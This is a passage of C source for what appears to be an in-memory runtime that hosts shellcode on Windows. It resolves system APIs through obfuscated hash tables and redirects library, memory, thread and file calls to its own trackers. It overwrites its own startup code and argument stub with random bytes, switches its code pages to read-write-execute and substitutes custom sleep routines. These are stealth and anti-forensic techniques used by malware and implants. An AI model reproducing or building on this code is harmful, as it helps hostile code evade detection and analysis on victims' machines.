        .VirtualFree            = runtime->VirtualFree,
        .VirtualProtect         = runtime->VirtualProtect,
        .VirtualQuery           = runtime->VirtualQuery,
        .FlushInstructionCache  = runtime->FlushInstructionCache,
        .SuspendThread          = runtime->SuspendThread,
        .ResumeThread           = runtime->ResumeThread,
        .ExitThread             = runtime->ExitThread,
        .CreateMutexA           = runtime->CreateMutexA,
        .ReleaseMutex           = runtime->ReleaseMutex,
        .CreateEventA           = runtime->CreateEventA,
        .SetEvent               = runtime->SetEvent,
        .CreateWaitableTimerA   = runtime->CreateWaitableTimerA,
        .SetWaitableTimer       = runtime->SetWaitableTimer,
        .WaitForSingleObject    = runtime->WaitForSingleObject,
        .WaitForMultipleObjects = runtime->WaitForMultipleObjects,
        .DuplicateHandle        = runtime->DuplicateHandle,
        .CloseHandle            = runtime->CloseHandle,
        .Sleep                  = GetFuncAddr(&RT_Sleep),
    };

    // initialize runtime submodules
    typedef errno (*module_t)(Runtime* runtime, Context* context);
    module_t submodules[] = 
    {
        GetFuncAddr(&initLibraryTracker),
        GetFuncAddr(&initMemoryTracker),
        GetFuncAddr(&initThreadTracker),
        GetFuncAddr(&initResourceTracker),
        GetFuncAddr(&initArgumentStore),
        GetFuncAddr(&initInMemoryStorage),
    };
    for (int i = 0; i < arrlen(submodules); i++)
    {
        errno errno = submodules[i](runtime, &context);
        if (errno != NO_ERROR)
        {
            return errno;
        }
    }

    // update context about runtime submodules
    context.mt_malloc  = runtime->MemoryTracker->Alloc;
    context.mt_calloc  = runtime->MemoryTracker->Calloc;
    context.mt_realloc = runtime->MemoryTracker->Realloc;
    context.mt_free    = runtime->MemoryTracker->Free;
    context.mt_msize   = runtime->MemoryTracker->Size;
    context.mt_mcap    = runtime->MemoryTracker->Cap;

    // initialize high-level modules
    module_t hl_modules[] = 
    {
        GetFuncAddr(&initWinBase),
        GetFuncAddr(&initWinFile),
        GetFuncAddr(&initWinHTTP),
        GetFuncAddr(&initWinCrypto),
    };
    for (int i = 0; i < arrlen(hl_modules); i++)
    {
        errno errno = hl_modules[i](runtime, &context);
        if (errno != NO_ERROR)
        {
            return errno;
        }
    }

    // update context about continue modules
    context.hMutex_LT  = runtime->LibraryTracker->hMutex;
    context.hMutex_MT  = runtime->MemoryTracker->hMutex;
    context.hMutex_TT  = runtime->ThreadTracker->hMutex;
    context.hMutex_RT  = runtime->ResourceTracker->hMutex;
    context.hMutex_AS  = runtime->ArgumentStore->hMutex;
    context.hMutex_IMS = runtime->InMemoryStorage->hMutex;

    context.TT_NewThread        = runtime->ThreadTracker->New;
    context.TT_RecoverThreads   = runtime->ThreadTracker->Recover;
    context.TT_ForceKillThreads = runtime->ThreadTracker->ForceKill;

    context.RT_Cleanup = GetFuncAddr(&RT_Cleanup);
    context.RT_Stop    = GetFuncAddr(&RT_Stop);

    context.WD_IsEnabled = GetFuncAddr(&MW_WD_IsEnabled);

    // initialize reliability modules
    module_t rel_modules[] = 
    {
        GetFuncAddr(&initSysmon),
        GetFuncAddr(&initWatchdog),
    };
    for (int i = 0; i < arrlen(rel_modules); i++)
    {
        errno errno = rel_modules[i](runtime, &context);
        if (errno != NO_ERROR)
        {
            return errno;
        }
    }

    // copy mutex handle for runtime
    runtime->ModMutexHandle[0] = runtime->LibraryTracker->hMutex;
    runtime->ModMutexHandle[1] = runtime->MemoryTracker->hMutex;
    runtime->ModMutexHandle[2] = runtime->ThreadTracker->hMutex;
    runtime->ModMutexHandle[3] = runtime->ResourceTracker->hMutex;
    runtime->ModMutexHandle[4] = runtime->ArgumentStore->hMutex;
    runtime->ModMutexHandle[5] = runtime->InMemoryStorage->hMutex;

    // clean useless API functions in runtime structure
    RandBuffer((byte*)(&runtime->GetSystemInfo), sizeof(uintptr));
    RandBuffer((byte*)(&runtime->CreateMutexA),  sizeof(uintptr));
    return NO_ERROR;
}

static errno initLibraryTracker(Runtime* runtime, Context* context)
{
    LibraryTracker_M* tracker = InitLibraryTracker(context);
    if (tracker == NULL)
    {
        return GetLastErrno();
    }
    runtime->LibraryTracker = tracker;
    return NO_ERROR;
}

static errno initMemoryTracker(Runtime* runtime, Context* context)
{
    MemoryTracker_M* tracker = InitMemoryTracker(context);
    if (tracker == NULL)
    {
        return GetLastErrno();
    }
    runtime->MemoryTracker = tracker;
    return NO_ERROR;
}

static errno initThreadTracker(Runtime* runtime, Context* context)
{
    ThreadTracker_M* tracker = InitThreadTracker(context);
    if (tracker == NULL)
    {
        return GetLastErrno();
    }
    runtime->ThreadTracker = tracker;
    return NO_ERROR;
}

static errno initResourceTracker(Runtime* runtime, Context* context)
{
    ResourceTracker_M* tracker = InitResourceTracker(context);
    if (tracker == NULL)
    {
        return GetLastErrno();
    }
    runtime->ResourceTracker = tracker;
    return NO_ERROR;
}

static errno initArgumentStore(Runtime* runtime, Context* context)
{
    ArgumentStore_M* store = InitArgumentStore(context);
    if (store == NULL)
    {
        return GetLastErrno();
    }
    runtime->ArgumentStore = store;
    return NO_ERROR;
}

static errno initInMemoryStorage(Runtime* runtime, Context* context)
{
    InMemoryStorage_M* storage = InitInMemoryStorage(context);
    if (storage == NULL)
    {
        return GetLastErrno();
    }
    runtime->InMemoryStorage = storage;
    return NO_ERROR;
}

static errno initWinBase(Runtime* runtime, Context* context)
{
    WinBase_M* WinBase = InitWinBase(context);
    if (WinBase == NULL)
    {
        return GetLastErrno();
    }
    runtime->WinBase = WinBase;
    return NO_ERROR;
}

static errno initWinFile(Runtime* runtime, Context* context)
{
    WinFile_M* WinFile = InitWinFile(context);
    if (WinFile == NULL)
    {
        return GetLastErrno();
    }
    runtime->WinFile = WinFile;
    return NO_ERROR;
}

static errno initWinHTTP(Runtime* runtime, Context* context)
{
    WinHTTP_M* WinHTTP = InitWinHTTP(context);
    if (WinHTTP == NULL)
    {
        return GetLastErrno();
    }
    runtime->WinHTTP = WinHTTP;
    return NO_ERROR;
}

static errno initWinCrypto(Runtime* runtime, Context* context)
{
    WinCrypto_M* WinCrypto = InitWinCrypto(context);
    if (WinCrypto == NULL)
    {
        return GetLastErrno();
    }
    runtime->WinCrypto = WinCrypto;
    return NO_ERROR;
}

static errno initSysmon(Runtime* runtime, Context* context)
{
    Sysmon_M* Sysmon = InitSysmon(context);
    if (Sysmon == NULL)
    {
        return GetLastErrno();
    }
    runtime->Sysmon = Sysmon;
    return NO_ERROR;
}

static errno initWatchdog(Runtime* runtime, Context* context)
{
    Watchdog_M* Watchdog = InitWatchdog(context);
    if (Watchdog == NULL)
    {
        return GetLastErrno();
    }
    runtime->Watchdog = Watchdog;
    return NO_ERROR;
}

static bool initAPIRedirector(Runtime* runtime)
{
    LibraryTracker_M*  LT = runtime->LibraryTracker;
    MemoryTracker_M*   MT = runtime->MemoryTracker;
    ThreadTracker_M*   TT = runtime->ThreadTracker;
    ResourceTracker_M* RT = runtime->ResourceTracker;

    typedef struct {
        uint mHash; uint pHash; uint hKey; void* api;
    } rdr;
    rdr list[] =
#ifdef _WIN64
    {
        { 0xFF4DA9811A24DD2A, 0xE6E26FB6E4FE59CE, 0x10BB9100F93D0F8B, GetFuncAddr(&RT_GetProcAddress) },
        { 0xC1166F5480F32BFD, 0x12A3CA6BA34EAD87, 0x4DC32CDE85E16492, GetFuncAddr(&RT_SetCurrentDirectoryA) },
        { 0xFBE4BC0513717538, 0x891F575DD3B8F3E6, 0x9D79D93FAB212FD8, GetFuncAddr(&RT_SetCurrentDirectoryW) },
        { 0x6434DEA711176856, 0x0BB33DC44169CD1C, 0x962140866F051973, GetFuncAddr(&RT_SleepHR) }, // kernel32.Sleep
        { 0xDF5822C48AE06E22, 0x0C095075F316AE39, 0x058807734232290F, GetFuncAddr(&RT_SleepEx) }, // kernel32.SleepEx
        { 0x4DC42B3903DA99C6, 0xCA400801FF61A34E, 0xE1AC9F7852E1B05D, LT->LoadLibraryA },
        { 0xFC7A7C50BCFD6225, 0xDBD45608DD3235FA, 0xFEC559962D6601D9, LT->LoadLibraryW },
        { 0x7375B34705AE6800, 0xDD32124FBD682FB9, 0x049E6B412B5D442D, LT->LoadLibraryExA },
        { 0x1896A460454253F3, 0x3FCC5C6C3F82C2BE, 0xAB0B4D9079E2A130, LT->LoadLibraryExW },
        { 0x1496C27FE3608899, 0xB43C2134E4723CA2, 0xF1A7017F9F0C94F3, LT->FreeLibrary },
        { 0xE80B5CBE037995D7, 0x2788C62E627713D4, 0x866469F01DBF6133, LT->FreeLibraryAndExitThread },
        { 0xD7409B7A8292AA03, 0x66E9F2BA41E2A0C2, 0x1FA76CFBFF379502, MT->VirtualAlloc },
        { 0xC8EE591299E0F9A2, 0x603E56ED7C1537F4, 0x52F1C8C0B584364E, MT->VirtualFree },
        { 0x978351ED493CACDE, 0x3A1198A4675C5EC3, 0x4E8AAF5E5D075B4A, MT->VirtualProtect },
        { 0x703806E0587E928B, 0xAA7548E17B62D7F8, 0xDCFEB1AF57895416, MT->VirtualQuery },
        { 0xB01F1D8C667AABC3, 0x07DB7553F4BC04BE, 0xF982F021BF11141E, MT->HeapCreate },
        { 0x6453FCEA8686D0B2, 0x8969C9C075773B1F, 0x539B4168D258E6D1, MT->HeapDestroy },
        { 0x48A9D2FB20F58D7E, 0x91937D49AF9FFAB9, 0xFF298C980C1FA51C, MT->HeapAlloc },
        { 0x431DA6E0CB500521, 0x27D5BFE5E7FEA339, 0xAB8CB329F8568805, MT->HeapReAlloc },
        { 0xCCCAB3E4FFBC9243, 0xE36248C464C39491, 0x9A21FFFBDCCFCB53, MT->HeapFree },
        { 0xB201A5400764FE9F, 0x9194EEFD9C18C50E, 0x7DDC64814D267471, MT->HeapSize },
        { 0x6D994AD4EB52E6A3, 0x970FBBB0DC7425CC, 0xCCA0C65AC9CA766E, MT->GlobalAlloc },
        { 0x53E8DBD868752C6A, 0xFF13BFC56EF8D89D, 0xBE039A649C308043, MT->GlobalReAlloc },
        { 0xE83083D2D450DA12, 0x992429E01F37C2CB, 0x1DEC53513323DAF3, MT->GlobalFree },
        { 0x72DF45871184EAF7, 0x64BDFC1946C13262, 0x0B6B7BAA8E332572, MT->LocalAlloc },
        { 0x505894A74E77B8DD, 0xA31D116D5758AC8B, 0xF0B791821E236189, MT->LocalReAlloc },
        { 0x43F1AF438F3E85A3, 0x287C7FAF838267FC, 0x9B059DD440D97436, MT->LocalFree },
        { 0x3CCA726C479AD6EE, 0x3982604A64E78596, 0xD2E8220B9E91AB06, MT->HeapAlloc },   // ntdll.RtlAllocateHeap
        { 0xAB07832BADB3A35C, 0xF739177359998320, 0x94BE3DC57A355EA9, MT->HeapReAlloc }, // ntdll.RtlReAllocateHeap
        { 0x751B90853766930B, 0xB989CF296AEDD473, 0x98D91AD0B8459B8F, MT->HeapFree },    // ntdll.RtlFreeHeap
        { 0x45BBAE8A1FCFB479, 0x3D50CA10768C5333, 0xE48E4568E8787962, MT->HeapSize },    // ntdll.RtlSizeHeap
        { 0x7AE661DB0F788E5C, 0xB381DBCED8473B71, 0x69E41F98377E69D4, TT->CreateThread },
        { 0xF73998C5A8F14826, 0x8B4E255AD410EAD7, 0x9B3C17E907A5484C, TT->ExitThread },
        { 0x20BD6DCF83AFA005, 0xFB3FE4456FDDEE5F, 0x975665E2E638718B, TT->SuspendThread },
        { 0x4D761AB490D8073A, 0x9685B1FA1A78AB3B, 0x3147A2CFAB9E8418, TT->ResumeThread },
        { 0xF8CDF3A3B3344333, 0xF4043DBAE6716F9F, 0x292410324C701889, TT->SwitchToThread },
        { 0x7FCCDBCBE7C33ADD, 0x13ABEAA649DA39A3, 0xB13709F7CAE53462, TT->GetThreadContext },
        { 0xAD0FEDE61F0DCBB4, 0xF9200CC7DA05AB20, 0x4916730ED354C174, TT->SetThreadContext },
        { 0x09A5E16541C6FFD5, 0xB92D0C6BFD17BF1B, 0x1D78909BB79BD1D5, TT->TerminateThread },
        { 0x09A62B080D340D1B, 0x1478DA3E8F430166, 0xF94DDE91551E2590, TT->TlsAlloc },
        { 0x57865BE523C6F35C, 0x67ED5FAFB746E8A1, 0xEB45D478BCF5D601, TT->TlsFree },
        { 0xEB1473C837B3C707, 0x0F1F3A80639190F0, 0x5DDCB437BC0EB0B5, TT->ExitThread }, // ntdll.RtlExitUserThread
        { 0x99C62FC1DAFA9048, 0x3530C7A2989E405E, 0x5C88A5AEFEF64834, RT->CreateMutexA },
        { 0x225525D7E1D96BC1, 0x86944DBCCD5B7259, 0xEEE0821AAFA4CA21, RT->CreateMutexW },
        { 0x64C8B5FAD0281FAE, 0x1F96D8316C44D1D4, 0xC7DA7E9547354011, RT->CreateMutexExA },
        { 0x5E73458A1ACB6B6A, 0x84F3DC894B35A8DE, 0x0461DDB218E419CE, RT->CreateMutexExW },
        { 0x65FDAF0179C614B8, 0x35C115CA65D648C4, 0xAA378A25AC9AB5E9, RT->CreateEventA },
        { 0x21C2ABE21174C47A, 0xEA76EA9AC1F1684A, 0x613B893DE4586476, RT->CreateEventW },
        { 0xC2F87FCE4482C4F7, 0xEB18086734568FCC, 0x02B4EE3ADC6A3FCA, RT->CreateEventExA },
        { 0x48140C98E094E87C, 0x181AEEE9288159AF, 0x40C8A0F5488D4F54, RT->CreateEventExW },
        { 0xF5F46006AC9C2B76, 0xA0B7DF1BA221BC91, 0xA2627AA845D4ADD3, RT->CreateSemaphoreA },
        { 0x7AEAFF9C6927EBA1, 0xE3D01A901CABA296, 0x042F915AFC8193B3, RT->CreateSemaphoreW },
        { 0x2F7D90634738CBE8, 0x6E639EF7EE6D9176, 0xDB929B6C60E18532, RT->CreateSemaphoreExA },
        { 0x0640A74B0320C944, 0x5166B7C020880A94, 0xF71BCA9C7F743C9D, RT->CreateSemaphoreExW },
        { 0x730DFCCA2AF4090A, 0x70CDEC5C504AE236, 0xB4F98E7A332755BC, RT->CreateWaitableTimerA },
        { 0x064CC5AE35E819AA, 0xED30A4C7A7A29614, 0xE2DD88A002EB655D, RT->CreateWaitableTimerW },
        { 0x1E67E2753BD78487, 0x9AF0CF492273B49C, 0x3944AB9D9A903991, RT->CreateWaitableTimerExA },
        { 0xEDD5DF96E1FED57C, 0x6A5ECC6AC89B05A6, 0x9DCD84144BF41E29, RT->CreateWaitableTimerExW },
        { 0x1D043CEA4558BA25, 0x8CCB1AEF14C033F5, 0xD4471E9865D53D00, RT->CreateFileA },
        { 0x920DCCF0F5F7DA72, 0x0354305F3C1449E6, 0xB0226C18509E2B0A, RT->CreateFileW },
        { 0xFECB303663463D17, 0x90F8CB9DC1CDF040, 0x661D3543C6070977, RT->FindFirstFileA },
        { 0x43758302CFD0129F, 0x9C617D9F679966A9, 0x7C162B0964F1F869, RT->FindFirstFileW },
        { 0x4B39DE018161DB6E, 0xCAA6B778974CC796, 0xD2B1B4DB48AEB5F4, RT->FindFirstFileExA },
        { 0x2AF32F5D17A63DD4, 0xFB3E8E2D3D7BE252, 0x94F2667600F89324, RT->FindFirstFileExW },
        { 0xAAFBF725D02B6277, 0xE7220B97A4CFC0DF, 0x81EAC7CC69BC5196, RT->CreateIoCompletionPort },
        { 0xDEFDF1FADF466CDB, 0xD050B317F8B21AD5, 0xD625D5FF82F41F79, RT->CloseHandle },
        { 0xD3B4923F11FD94BD, 0xCDB1197EBC4CE881, 0x1CA257168FA33339, RT->FindClose },
    };
#elif _WIN32
    {
        { 0x75C01F83, 0xE7A45E2B, 0x1A710E4F, GetFuncAddr(&RT_GetProcAddress) },
        { 0x6B13DC24, 0x53E41BF6, 0xFFB6599D, GetFuncAddr(&RT_SetCurrentDirectoryA) },
        { 0x7C903CB0, 0xCAF08A95, 0xBB8B0575, GetFuncAddr(&RT_SetCurrentDirectoryW) },
        { 0x536949F6, 0x6C9410A5, 0x82568B27, GetFuncAddr(&RT_SleepHR) }, // kernel32.Sleep
        { 0x6B23E4B7, 0xBA37BAF4, 0x0257F540, GetFuncAddr(&RT_SleepEx) }, // kernel32.SleepEx
        { 0xAE0F3CDC, 0xBF4F25FA, 0xA131C539, LT->LoadLibraryA },
        { 0x056314A0, 0x55A90F7E, 0x5349346C, LT->LoadLibraryW },
        { 0x10155272, 0xD2755464, 0x45CB6974, LT->LoadLibraryExA },
        { 0xE83FAC7C, 0xE7E0555F, 0xD02A70FA, LT->LoadLibraryExW },
        { 0xC6B49249, 0x7CF00FF3, 0x7E640DFE, LT->FreeLibrary },
        { 0x6CB7C079, 0xDD1E6C19, 0x1E78E88B, LT->FreeLibraryAndExitThread },
        { 0xB12814A3, 0x7F957F91, 0x920F498C, MT->VirtualAlloc },
        { 0xB30913F5, 0xEEB6D179, 0x6BD6BE8F, MT->VirtualFree },
        { 0x0F6EFC7B, 0x774CBC01, 0x3BEB1DF1, MT->VirtualProtect },
        { 0x9ED03376, 0x5DBBA619, 0x8A536EBB, MT->VirtualQuery },
        { 0x701E200B, 0xFAA011A1, 0xAC5B0514, MT->HeapCreate },
        { 0xEF53D08B, 0x90745C68, 0x7384548D, MT->HeapDestroy },
        { 0xF62559E9, 0x89B885C0, 0x0CBA79B5, MT->HeapAlloc },
        { 0xABC1D166, 0x97530A92, 0xEF4E2221, MT->HeapReAlloc },
        { 0xEB6DE792, 0x69AC5529, 0x9F0F87FB, MT->HeapFree },
        { 0xD68F0BD7, 0xA9F4245F, 0xED73D3EF, MT->HeapSize },
        { 0x612B3351, 0xE09ED8B6, 0x012810C6, MT->GlobalAlloc },
        { 0x5755B294, 0x424951CC, 0x29D66E25, MT->GlobalReAlloc },
        { 0x31CF7EA8, 0xCE2AD6ED, 0x7367D738, MT->GlobalFree },
        { 0x00D8F488, 0x5827541B, 0x6F8715EE, MT->LocalAlloc },
        { 0x1B89932A, 0x541A3F04, 0x02FA4395, MT->LocalReAlloc },
        { 0x6FE61AEE, 0xEA812AF6, 0x383C2DD3, MT->LocalFree },
        { 0x49F19F51, 0x228ABB50, 0x5B0571BF, MT->HeapAlloc },   // ntdll.RtlAllocateHeap
        { 0x92FBC22D, 0xFE3F6DB3, 0x5A30B52A, MT->HeapReAlloc }, // ntdll.RtlReAllocateHeap
        { 0x8071A3F9, 0x8C626652, 0x0AB58ABE, MT->HeapFree },    // ntdll.RtlFreeHeap
        { 0x2319794C, 0x8D15D816, 0xCEB11EBF, MT->HeapSize },    // ntdll.RtlSizeHeap
        { 0x180AA55F, 0x521C35F1, 0x5A388498, TT->CreateThread },
        { 0x5F6414CA, 0x827087DB, 0x07E06220, TT->ExitThread },
        { 0x0C4A7B00, 0xE64D2B70, 0xA796CEBC, TT->SuspendThread },
        { 0x1FC3902D, 0x7DEAD8EA, 0x1DE3BC77, TT->ResumeThread },
        { 0xA7AFFFE1, 0x21C2F6AD, 0x4725C481, TT->SwitchToThread },
        { 0xC9BFAF22, 0xD306FEA3, 0xC72778A3, TT->GetThreadContext },
        { 0x229AEC25, 0x7D98D610, 0x82904254, TT->SetThreadContext },
        { 0x8C2FB5E2, 0x186C157F, 0xCDD4F7E1, TT->TerminateThread },
        { 0xD7E2EA10, 0xCEC74DB0, 0x3E447291, TT->TlsAlloc },
        { 0x76A15683, 0xC0C732AD, 0x535505D9, TT->TlsFree },
        { 0x84240642, 0xA1CA7092, 0xF6578A0D, TT->ExitThread }, // ntdll.RtlExitUserThread
        { 0x6B3F6DAC, 0x43853234, 0x54455751, RT->CreateMutexA },
        { 0x55DC0D79, 0x785F6BF5, 0x3D6CBA5B, RT->CreateMutexW },
        { 0xC0ADF2A0, 0x21E1899D, 0xAAFF7F26, RT->CreateMutexExA },
        { 0xFD4A95C1, 0x87F78CD0, 0x0B1DBA2F, RT->CreateMutexExW },
        { 0x6DCC244C, 0xCC2BAC5F, 0x4D514C21, RT->CreateEventA },
        { 0x2C2D5A25, 0x8A86DD59, 0x6A4FA4CF, RT->CreateEventW },
        { 0xE64C076A, 0xD4311E97, 0xD71810CE, RT->CreateEventExA },
        { 0x395E0289, 0xAEE603B7, 0x0DF82E32, RT->CreateEventExW },
        { 0xC9E40740, 0x623C96BC, 0xF0B6E24D, RT->CreateSemaphoreA },
        { 0xF3DD5560, 0x4C95D8DF, 0x23839135, RT->CreateSemaphoreW },
        { 0x6E2E92AA, 0x8ECEED49, 0xB91D8BFA, RT->CreateSemaphoreExA },
        { 0x72C09E63, 0xB62A71B3, 0x2C269677, RT->CreateSemaphoreExW },
        { 0x416EE6B3, 0x60DA6B28, 0x6AF9FCB6, RT->CreateWaitableTimerA },
        { 0x6A3B2387, 0x36D3924E, 0xF22D3841, RT->CreateWaitableTimerW },
        { 0xED2289F2, 0x3D1086F9, 0x7ADCB925, RT->CreateWaitableTimerExA },
        { 0xB608ED94, 0x6FAF9FDA, 0x448DEED2, RT->CreateWaitableTimerExW },
        { 0x49833F45, 0x28AF75DA, 0x9DC87AA2, RT->CreateFileA },
        { 0x99F11002, 0x02C3BD06, 0x68E258F3, RT->CreateFileW },
        { 0xEACF49CC, 0xDEE66AAD, 0x582829BB, RT->FindFirstFileA },
        { 0x38D22305, 0x2CA21077, 0xEB734887, RT->FindFirstFileW },
        { 0xA7384FD2, 0x19EC08BE, 0x236E1ADE, RT->FindFirstFileExA },
        { 0x6D47C5C0, 0xCD54D722, 0xB3DD8291, RT->FindFirstFileExW },
        { 0x574C1718, 0xA2973DEC, 0x68050AB3, RT->CreateIoCompletionPort },
        { 0x0E06B653, 0x78265D27, 0x62FF3474, RT->CloseHandle },
        { 0xCA74F49F, 0x56182478, 0xED040027, RT->FindClose },
    };
#endif
    for (int i = 0; i < arrlen(list); i++)
    {
        rdr   item = list[i];
        void* proc = FindAPI_SC(item.mHash, item.pHash, item.hKey);
        if (proc == NULL)
        {
            return false;
        }
        runtime->Redirectors[i].src = proc;
        runtime->Redirectors[i].dst = item.api;
    }
    return true;
}

__declspec(noinline)
static void eraseArgumentStub(Runtime* runtime)
{
    if (runtime->Options.NotEraseInstruction)
    {
        return;
    }
    // stub will be erased, if load argument successfully
    if (!isValidArgumentStub())
    {
        return;
    }
    uintptr stub = (uintptr)(GetFuncAddr(&Argument_Stub));
    uint32  size = *(uint32*)(stub + ARG_OFFSET_ARGS_SIZE);
    RandBuffer((byte*)stub, ARG_HEADER_SIZE + size);
}

__declspec(noinline)
static void eraseRuntimeMethods(Runtime* runtime)
{
    if (runtime->Options.NotEraseInstruction)
    {
        return;
    }
    uintptr begin = (uintptr)(GetFuncAddr(&allocRuntimeMemPage));
    uintptr end   = (uintptr)(GetFuncAddr(&eraseRuntimeMethods));
    uintptr size  = end - begin;
    RandBuffer((byte*)begin, (int64)size);
}

// ======================== these instructions will not be erased ========================

// change memory protect for dynamic update pointer that hard encode.
__declspec(noinline)
static bool adjustPageProtect(Runtime* runtime, DWORD* old)
{
    if (runtime->Options.NotAdjustProtect)
    {
        return true;
    }
    void* init = GetFuncAddr(&InitRuntime);
    void* addr = runtime->Options.BootInstAddress;
    if (addr == NULL || (uintptr)addr > (uintptr)init)
    {
        addr = init;
    }
    uintptr begin = (uintptr)(addr);
    uintptr end   = (uintptr)(runtime->Epilogue);
    uint    size  = end - begin;
    if (old == NULL)
    {
        DWORD oldProtect = 0;
        old = &oldProtect;
    }
    return runtime->VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, old);
}

__declspec(noinline)
static bool recoverPageProtect(Runtime* runtime, DWORD protect)
{
    if (runtime->Options.NotAdjustProtect)
    {
        return true;
    }
    void* init = GetFuncAddr(&InitRuntime);
    void* addr = runtime->Options.BootInstAddress;
    if (addr == NULL || (uintptr)addr > (uintptr)init)
    {
        addr = init;
    }
    uintptr begin = (uintptr)(addr);
    uintptr end   = (uintptr)(runtime->Epilogue);
    uint    size  = end - begin;
    DWORD   old;
    return runtime->VirtualProtect(addr, size, protect, &old);
}

__declspec(noinline)
static bool flushInstructionCache(Runtime* runtime)
{
    void* init = GetFuncAddr(&InitRuntime);
    void* addr = runtime->Options.BootInstAddress;
    if (addr == NULL || (uintptr)addr > (uintptr)init)
    {
        addr = init;
    }
    uintptr begin = (uintptr)(addr);
    uintptr end   = (uintptr)(runtime->Epilogue);
    uint    size  = end - begin;
    return runtime->FlushInstructionCache(CURRENT_PROCESS, addr, size);
}

static errno cleanRuntime(Runtime* runtime)
{
    errno err = NO_ERROR;
    // close all handles in runtime
    errno enchd = closeHandles(runtime);
    if (enchd != NO_ERROR && err == NO_ERROR)
    {
        err = enchd;
    }
    // must copy variables in Runtime before call RandBuf
    VirtualFree_t virtualFree = runtime->VirtualFree;
    void* memPage = runtime->MainMemPage;
    // release main memory page
    RandBuffer(memPage, MAIN_MEM_PAGE_SIZE);
    if (virtualFree != NULL)
    {
        if (!virtualFree(memPage, 0, MEM_RELEASE) && err == NO_ERROR)
        {
            err = ERR_RUNTIME_CLEAN_FREE_MEM;
        }
    }
    return err;
}

// TODO need remove?
static errno closeHandles(Runtime* runtime)
{
    if (runtime->CloseHandle == NULL)
    {
        return NO_ERROR;
    }
    typedef struct { 
        HANDLE handle; errno errno;
    } handle;
    handle list[] = 
    {
        { runtime->hMutex, ERR_RUNTIME_CLEAN_H_MUTEX },
    };
    errno errno = NO_ERROR;
    for (int i = 0; i < arrlen(list); i++)
    {
        if (list[i].handle == NULL)
        {
            continue;
        }
        if (!runtime->CloseHandle(list[i].handle) && errno == NO_ERROR)
        {
            errno = list[i].errno;
        }
    }
    return errno;
}

// updateRuntimePointer will replace hard encode address to the actual address.
// Must disable compiler optimize, otherwise updateRuntimePointer will fail.
#pragma optimize("", off)
static Runtime* getRuntimePointer()
{
    uintptr pointer = RUNTIME_POINTER;
    return (Runtime*)(pointer);
}
#pragma optimize("", on)

__declspec(noinline)
static bool rt_lock()
{
    Runtime* runtime = getRuntimePointer();

    DWORD event = runtime->WaitForSingleObject(runtime->hMutex, INFINITE);
    return event == WAIT_OBJECT_0 || event == WAIT_ABANDONED;
}

__declspec(noinline)
static bool rt_unlock()
{
    Runtime* runtime = getRuntimePointer();

    return runtime->ReleaseMutex(runtime->hMutex);
}

// +---------+----------+-------------+
// |  size   | capacity | user buffer |
// +---------+----------+-------------+
// |  uint   |   uint   |     var     |
// +---------+----------+-------------+

__declspec(noinline)
void* RT_malloc(uint size)
{
    Runtime* runtime = getRuntimePointer();

    if (size == 0)
    {
        return NULL;
    }
    // ensure the size is a multiple of memory page size.
    // it also for prevent track the special page size.
    uint pageSize = (((size + 16) / runtime->PageSize) + 1) * runtime->PageSize;
    void* addr = runtime->VirtualAlloc(NULL, pageSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (addr == NULL)
    {
        return NULL;
    }
    // store the size at the head of the memory page
    // ensure the memory address is 16 bytes aligned
    byte* address = (byte*)addr;
    RandBuffer(address, 16);
    // record user input size
    mem_copy(address, &size, sizeof(size));
    // record buffer capacity
    uint cap = pageSize - 16;
    mem_copy(address + sizeof(size), &cap, sizeof(cap));
    dbg_log("[runtime]", "malloc size: %zu", size);
    return (void*)(address + 16);
}

__declspec(noinline)
void* RT_calloc(uint num, uint size)
{
    uint total = num * size;
    if (total == 0)
    {
        return NULL;
    }
    void* addr = RT_malloc(total);
    if (addr == NULL)
    {
        return NULL;
    }
    mem_init(addr, total);
    dbg_log("[runtime]", "calloc num: %zu, size: %zu", num, size);
    return addr;
}

__declspec(noinline)
void* RT_realloc(void* ptr, uint size)
{
    if (ptr == NULL)
    {
        return RT_malloc(size);
    }
    if (size == 0)
    {
        RT_free(ptr);
        return NULL;
    }
    // check need expand capacity
    uint cap = RT_mcap(ptr);
    if (size <= cap)
    {
        *(uint*)((uintptr)(ptr)-16) = size;
        return ptr;
    }
    // allocate new memory
    if (cap < 65536)
    {
        cap = size * 2;
    } else {
        cap = size * 5 / 4; // size *= 1.25
    }
    void* newPtr = RT_malloc(size);
    if (newPtr == NULL)
    {
        return NULL;
    }
    // copy data to new memory
    uint oldSize = *(uint*)((uintptr)(ptr)-16);
    mem_copy(newPtr, ptr, oldSize);
    // free old memory
    if (!RT_free(ptr))
    {
        RT_free(newPtr);
        return NULL;
    }
    dbg_log("[runtime]", "realloc ptr: 0x%zX, size: %zu", ptr, size);
    return newPtr;
}

__declspec(noinline)
bool RT_free(void* ptr)
{
    Runtime* runtime = getRuntimePointer();

    if (ptr == NULL)
    {
        return true;
    }
    // clean the buffer data before call VirtualFree.
    void* addr = (void*)((uintptr)(ptr)-16);
    uint  size = *(uint*)addr;
    mem_init((byte*)addr, size);
    if (!runtime->VirtualFree(addr, 0, MEM_RELEASE))
    {
        return false;
    }
    dbg_log("[runtime]", "free ptr: 0x%zX", ptr);
    return true;
}

__declspec(noinline)
uint RT_msize(void* ptr)
{
    if (ptr == NULL)
    {
        return 0;
    }
    return *(uint*)((uintptr)(ptr)-16);
}

__declspec(noinline)
uint RT_mcap(void* ptr)
{
    if (ptr == NULL)
    {
        return 0;
    }
    return *(uint*)((uintptr)(ptr)-16+sizeof(uint));
}

__declspec(noinline)
errno RT_lock_mods()
{
    Runtime* runtime = getRuntimePointer();

    typedef bool (*lock_t)();
    typedef struct { 
        lock_t lock; errno errno;
    } submodule_t;

    submodule_t list[] = 
    {
        { runtime->Watchdog->Lock,        ERR_RUNTIME_LOCK_WATCHDOG },
        { runtime->Sysmon->Lock,          ERR_RUNTIME_LOCK_SYSMON   },
        { runtime->WinHTTP->Lock,         ERR_RUNTIME_LOCK_WIN_HTTP },
        { runtime->LibraryTracker->Lock,  ERR_RUNTIME_LOCK_LIBRARY  },
        { runtime->MemoryTracker->Lock,   ERR_RUNTIME_LOCK_MEMORY   },
        { runtime->ResourceTracker->Lock, ERR_RUNTIME_LOCK_RESOURCE },
        { runtime->ArgumentStore->Lock,   ERR_RUNTIME_LOCK_ARGUMENT },
        { runtime->InMemoryStorage->Lock, ERR_RUNTIME_LOCK_STORAGE  },
        { runtime->ThreadTracker->Lock,   ERR_RUNTIME_LOCK_THREAD   },
    };

